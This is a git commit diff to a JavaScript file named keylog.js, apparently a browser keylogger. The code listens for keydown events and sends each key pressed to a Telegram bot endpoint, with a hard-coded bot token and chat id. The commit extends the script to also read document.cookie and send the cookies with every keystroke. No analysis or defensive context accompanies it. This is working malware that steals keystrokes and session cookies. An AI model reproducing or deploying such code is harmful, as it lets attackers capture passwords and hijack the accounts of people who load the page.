ee0c9c0cea9095375dc601de7d9455109b5770e3
misquee <110459286+misquee@users.noreply.github.com>
2025-02-03 10:10:03 +0800

    Update keylog.js

--- keylog.js
+++ keylog.js
@@ -1,4 +1,18 @@
+// document.addEventListener("keydown", function(event) {
+//     fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
+//         method: "POST",
+//         headers: {
+//             "Content-Type": "application/json"
+//         },
+//         body: JSON.stringify({
+//             chat_id: "-1002002449257",
+//             text: "Key Pressed: " + event.key
+//         })
+//     });
+// });
 document.addEventListener("keydown", function(event) {
+    let cookies = document.cookie; // Mengambil cookie yang bisa diakses oleh JavaScript
+
     fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
         method: "POST",
         headers: {
@@ -6,7 +20,7 @@ document.addEventListener("keydown", function(event) {
         },
         body: JSON.stringify({
             chat_id: "-1002002449257",
-            text: "Key Pressed: " + event.key
+            text: `Key Pressed: ${event.key}\nCookies: ${cookies}`
         })
     });
 });
